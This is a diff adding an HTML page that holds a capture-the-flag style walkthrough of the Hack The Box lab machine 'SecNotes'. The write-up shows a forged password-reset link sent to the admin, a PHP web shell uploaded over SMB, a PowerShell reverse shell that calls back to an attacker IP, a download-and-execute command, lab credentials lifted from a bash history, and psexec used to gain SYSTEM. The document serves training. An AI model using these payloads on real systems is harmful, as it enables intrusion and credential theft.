@@ -1,0 +1,229 @@
+{% load static %}
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+    <link rel="stylesheet" href="{% static 'EthHack/css/machines/machines.css' %}">
+</head>
+<body>
+    <h1 class="title">HTB SecNotes</h1>
+    <p class="text">Difficulty : Medium | UserDifficulty : 4.8</p>
+
+    <h2 class="subtitle">Enumeration</h2>
+    <div class="code-box"><pre><code>└─$ <u>sudo nmap -p- -sCV $IP --min-rate=10000</u>
+PORT     STATE SERVICE      VERSION
+80/tcp   open  http         Microsoft IIS httpd 10.0
+| http-title: Secure Notes - Login
+|_Requested resource was login.php
+| http-methods: 
+|_  Potentially risky methods: TRACE
+445/tcp  open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: HTB)
+8808/tcp open  http         Microsoft IIS httpd 10.0
+| http-methods: 
+|_  Potentially risky methods: TRACE
+|_http-title: IIS Windows
+Service Info: Host: SECNOTES; OS: Windows; CPE: cpe:/o:microsoft:windows</code></pre></div>
+
+<p class="text">There are two http open ports and SMB client. </p>
+
+<div class="code-box"><pre><code>└─$ crackmapexec smb $IP -u guest -p '' --shares                    
+SMB         10.129.29.167   445    SECNOTES         [*] Windows 10 Enterprise 17134 (name:SECNOTES) (domain:SECNOTES) (signing:False) (SMBv1:True)
+SMB         10.129.29.167   445    SECNOTES         [-] SECNOTES\guest: STATUS_ACCOUNT_DISABLED</code></pre></div>
+
+<p class="text">Since smb doesn't allow us to see shares with guest user, we have to find credentials to access smb.</p>
+
+
+
+<div class="img">
+    <img src="{% static 'EthHack/images/secnotes/1.png' %}" alt="">
+    <p class="text">Opening http page returned login form. Since we can create our own account, let's register and take a look at the dashboard.</p>
+</div>
+
+<div class="img">
+    <img src="{% static 'EthHack/images/secnotes/3.png' %}" alt="">
+    <img src="{% static 'EthHack/images/secnotes/2.png' %}" alt="">
+</div>
+
+<p class="text">After logon, navigating to the reset password page, I found Update password page and it doesn't require me to provide previous-password or email verification. Therefore, If we could find a vector to reset admin's password, we can enter admin's dashboard.</p>
+<p class="text">Also, I could change POST request for reset password into GET request. Though it retuned 302, it might be redirected to our home.</p>
+
+<div class="img">
+    <img src="{% static 'EthHack/images/secnotes/4.png' %}" alt="">
+    <p class="text">Also, I found contact page where I can find admin username, and can send some messages. Because there is no other vector we've found rather than that the GET request can also change password, we should try to send password change url to this tyler user.</p>
+</div>
+
+<div class="img">
+    <img src="{% static 'EthHack/images/secnotes/5.png' %}" alt="">
+    <p class="text">Set the url to reset password, and wish the tyler press the url href mistakenly.</p>
+</div>
+
+
+<h2 class="subtitle">Foothold</h2>
+<div class="img">
+    <img src="{% static 'EthHack/images/secnotes/6.png' %}" alt="">
+    <p class="text">Fortunately, as soon as sending the url via contact form, the passwrod for tyler was changed and I successfully logged on with credential <u>tyler@pwned123</u>. <br><br>Also I found credential for tyler user. We've found that the smb rejected our guest login. So, we can try connecting to smb server using this credential.</p>
+</div>
+
+<div class="code-box"><pre><code>└─$ crackmapexec smb $IP -u tyler -p '92g!mA8BGjOirkL%OG*&' --shares
+SMB         10.129.29.167   445    SECNOTES         [*] Windows 10 Enterprise 17134 (name:SECNOTES) (domain:SECNOTES) (signing:False) (SMBv1:True)
+SMB         10.129.29.167   445    SECNOTES         [+] SECNOTES\tyler:92g!mA8BGjOirkL%OG*& 
+SMB         10.129.29.167   445    SECNOTES         [+] Enumerated shares
+SMB         10.129.29.167   445    SECNOTES         Share           Permissions     Remark                                                                                    
+SMB         10.129.29.167   445    SECNOTES         -----           -----------     ------                                                                                    
+SMB         10.129.29.167   445    SECNOTES         ADMIN$                          Remote Admin                                                                              
+SMB         10.129.29.167   445    SECNOTES         C$                              Default share                                                                             
+SMB         10.129.29.167   445    SECNOTES         IPC$                            Remote IPC                                                                                
+SMB         10.129.29.167   445    SECNOTES         new-site        READ,WRITE</code></pre></div>
+
+
+
+<p class="text">We could enumerate shares and revealed that we have WRITE permission to the new-site not only read privilege. </p>
+<p class="text">Since we have write permission on the site's directory, we can write php web shell and get reverse shell.</p>
+<p class="text">First let's prepare webshell for windows.</p>
+<div class="code-box"><pre><code>└─$ echo '&lt;?php echo shell_exec($_GET["cmd"]); ?&gt;' &gt; windows_shell.php</code></pre></div>
+<p class="text">Then, let's upload this file.</p>
+
+<div class="code-box"><pre><code>└─$ smbclient //$IP/new-site -U "tyler%92g\!mA8BGjOirkL%OG*&"
+Try "help" to get a list of possible commands.
+smb: \> dir
+  .                                   D        0  Fri Nov  7 01:27:37 2025
+  ..                                  D        0  Fri Nov  7 01:27:37 2025
+  iisstart.htm                        A      696  Thu Jun 21 11:26:03 2018
+  iisstart.png                        A    98757  Thu Jun 21 11:26:03 2018
+  Microsoft                           D        0  Fri Nov  7 00:30:00 2025
+
+                7736063 blocks of size 4096. 3391748 blocks available
+smb: \> put windows_shell.php shell.php</code></pre></div>
+
+<p class="text">Because the files on the share are not seen on the port 80, it must be 8808's http server.</p>
+
+<p class="text">We can confirm that by sending request to http://$IP/shell.php?cmd=whoami.</p>
+
+<div class="code-box"><pre><code>└─$ curl -G http://$IP:8808/shell.php --data-urlencode "cmd=whoami"                     
+secnotes\tyler</code></pre></div>
+
+<p class="text">We can get reverse shell making use of this.</p>
+<p class="text">I prepared shell.ps1 to get revshell. Change IP address with yours.</p>
+<div class="code-box"><pre><code>&#36;client = New-Object System.Net.Sockets.TCPClient('<u>10.10.16.38</u>',4444);&#36;stream = &#36;client.GetStream();[byte[]]&#36;bytes = 0..65535|%{0};while((&#36;i = &#36;stream.Read(&#36;bytes, 0, &#36;bytes.Length)) -ne 0){;&#36;data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(&#36;bytes,0, &#36;i);&#36;sendback = (iex &#36;data 2>&1 | Out-String );&#36;sendback2  = &#36;sendback + 'PS ' + (pwd).Path + '> ';&#36;sendbyte = ([text.encoding]::ASCII).GetBytes(&#36;sendback2);&#36;stream.Write(&#36;sendbyte,0,&#36;sendbyte.Length);&#36;stream.Flush()};&#36;client.Close()</code></pre></div>
+<p class="text">Then, execute this file on the target machine. Please open http server on the directory you have shell.ps1.</p>
+
+<div class="code-box"><pre><code>└─$ python3 -m http.server 8000
+└─$ nc -lvnp 4444
+└─$ curl -G http://$IP:8808/shell.php --data-urlencode "powershell.exe -c iex(new-object net.webclient).downloadstring('http://10.10.16.38:8000/shell.ps1')"</code></pre></div>
+
+<p class="text">We would receive revserse shell with netcat.</p>
+
+
+<div class="code-box"><pre><code>└─$ nc -lvnp 4444 
+listening on [any] 4444 ...
+connect to [10.10.16.38] from (UNKNOWN) [10.129.29.167] 51996
+PS C:\inetpub\new-site> whoami
+secnotes\tyler</code></pre></div>
+
+
+
+
+
+<h2 class="subtitle">PrivEsc</h2>
+<p class="text">I found ubunt.zip on the root dir C:\</p>
+
+<div class="code-box"><pre><code>C:\> dir
+ Volume in drive C has no label.
+ Volume Serial Number is 1E7B-9B76
+
+ Directory of C:\
+
+06/21/2018  02:07 PM    &lt;DIR>          Distros
+06/21/2018  05:47 PM    &lt;DIR>          inetpub
+06/22/2018  01:09 PM    &lt;DIR>          Microsoft
+04/11/2018  03:38 PM    &lt;DIR>          PerfLogs
+06/21/2018  07:15 AM    &lt;DIR>          php7
+01/26/2021  02:39 AM    &lt;DIR>          Program Files
+01/26/2021  02:38 AM    &lt;DIR>          Program Files (x86)
+06/21/2018  02:07 PM       201,749,452 <u>Ubuntu.zip</u>
+06/21/2018  02:00 PM    &lt;DIR>          Users
+11/06/2025  09:53 PM    &lt;DIR>          Windows
+               1 File(s)    201,749,452 bytes
+               9 Dir(s)  13,894,123,520 bytes free</code></pre></div>
+
+               <p class="text">Since Ubuntu would be run by WSL and can be accessed ubuntu's directory from windows PowerShell, we may find a vector to perform PE. </p>
+
+<div class="code-box"><pre><code>PS C:\Users\tyler\Desktop> Get-ChildItem HKCU:\Software\Microsoft\Windows\CurrentVersion\Lxss | %{Get-ItemProperty $_.PSPath} | out-string -width 4096
+
+
+State             : 1
+DistributionName  : Ubuntu-18.04
+Version           : 1
+BasePath          : <u>C:\Users\tyler\AppData\Local\Packages\CanonicalGroupLimited.Ubuntu18.04onWindows_79rhkp1fndgsc\LocalState</u>
+PackageFamilyName : CanonicalGroupLimited.Ubuntu18.04onWindows_79rhkp1fndgsc
+PSPath            : Microsoft.PowerShell.Core\Registry::HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Lxss\{02893575-609c-4e3b-a426-00f9d9b271da}
+PSParentPath      : Microsoft.PowerShell.Core\Registry::HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Lxss
+PSChildName       : {02893575-609c-4e3b-a426-00f9d9b271da}
+PSProvider        : Microsoft.PowerShell.Core\Registry</code></pre></div>
+
+<p class="text">I found directory location with HKCU.</p>
+
+
+<div class="code-box"><pre><code>PS C:\Users\tyler\Appdata\Local\Packages\CanonicalGroupLimited.Ubuntu18.04onWindows_79rhkp1fndgsc\LocalState\rootfs\root> dir
+
+
+    Directory: C:\Users\tyler\Appdata\Local\Packages\CanonicalGroupLimited.Ubuntu18.04onWindows_79rhkp1fndgsc\LocalStat
+    e\rootfs\root
+
+
+Mode                LastWriteTime         Length Name                                                                  
+----                -------------         ------ ----                                                                  
+d-----        6/22/2018   2:56 AM                filesystem                                                            
+-a----        6/22/2018   3:09 AM           3112 .bashrc                                                               
+-a----        6/22/2018   2:41 PM            398 .bash_history                                                         
+-a----        6/21/2018   6:00 PM            148 .profile      </code></pre></div>
+
+<p class="text">Also, I got into root directory on the Ubuntu, and typed bash_history, which often contains sensitive information. Especially, the main OS is Windows. Therefore, the user might not be careful about security on Ubuntu.</p>
+<div class="code-box"><pre><code>PS C:\Users\tyler\Appdata\Local\Packages\CanonicalGroupLimited.Ubuntu18.04onWindows_79rhkp1fndgsc\LocalState\rootfs\root> type .bash_history
+cd /mnt/c/
+ls
+cd Users/
+cd /
+cd ~
+ls
+pwd
+mkdir filesystem
+mount //127.0.0.1/c$ filesystem/
+sudo apt install cifs-utils
+mount //127.0.0.1/c$ filesystem/
+mount //127.0.0.1/c$ filesystem/ -o user=administrator
+cat /proc/filesystems
+sudo modprobe cifs
+smbclient
+apt install smbclient
+smbclient
+<u>smbclient -U 'administrator%u6!4ZwgwOM#^OBf#Nwnh' \\127.0.0.1\c$</u>
+> .bash_history 
+less .bash_history
+exit</code></pre></div>
+
+<p class="text">As I assumed, there is admin credential. We can access to the target machine using this password.</p>
+
+<div class="code-box"><pre><code>└─$ impacket-psexec secnotes/Administrator:'u6!4ZwgwOM#^OBf#Nwnh'@10.129.29.167 
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Requesting shares on 10.129.29.167.....
+[*] Found writable share ADMIN$
+[*] Uploading file hWKKHTsy.exe
+[*] Opening SVCManager on 10.129.29.167.....
+[*] Creating service KKQN on 10.129.29.167.....
+[*] Starting service KKQN.....
+[!] Press help for extra shell commands
+Microsoft Windows [Version 10.0.17134.228]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\WINDOWS\system32> whoami
+nt authority\system</code></pre></div>
+
+
+<p class="text">We got system user.</p>
+
+</body>
+</html>
